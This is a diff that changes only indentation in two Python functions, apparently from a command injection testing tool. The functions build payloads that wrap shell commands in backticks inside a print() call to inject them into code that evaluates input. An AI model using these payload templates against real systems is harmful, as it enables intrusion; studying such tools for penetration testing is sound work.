@@ -24,16 +24,16 @@ def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
 
   if separator == "":
     payload = ("print(`echo " + TAG + "`." +
-		"`echo " + B64_ENC_TAG + B64_DEC_TRICK + "`." +
-		"`echo " + TAG + "`);" +
-		separator
-	      )
+                "`echo " + B64_ENC_TAG + B64_DEC_TRICK + "`." +
+                "`echo " + TAG + "`);" +
+                separator
+              )
     
   else:
     payload = ("print(`echo " + TAG + "" +
-		separator + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "" +
-		separator + "echo " + TAG + "`);"
-	      )
+                separator + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "" +
+                separator + "echo " + TAG + "`);"
+              )
   
   return payload
 
@@ -42,18 +42,18 @@ def cmd_execution(separator,TAG,cmd):
   
   if separator == "":
     payload = ("print(`echo '" + TAG + "';" + 
-	        "echo '" + TAG + "';" +
-		cmd  +
-		"echo '" + TAG + "';" +
-		"echo '" + TAG + "'`);"
-	      )
+                "echo '" + TAG + "';" +
+                cmd  +
+                "echo '" + TAG + "';" +
+                "echo '" + TAG + "'`);"
+              )
     
   else:
     payload = ("print(`echo '" + TAG + "'" + 
-	        separator + "echo '" + TAG + "'" +
-		separator + cmd  +
-		separator + "echo '" + TAG + "'" +
-		separator + "echo '" + TAG + "'`);"
-	      )
+                separator + "echo '" + TAG + "'" +
+                separator + cmd  +
+                separator + "echo '" + TAG + "'" +
+                separator + "echo '" + TAG + "'`);"
+              )
   
   return payload
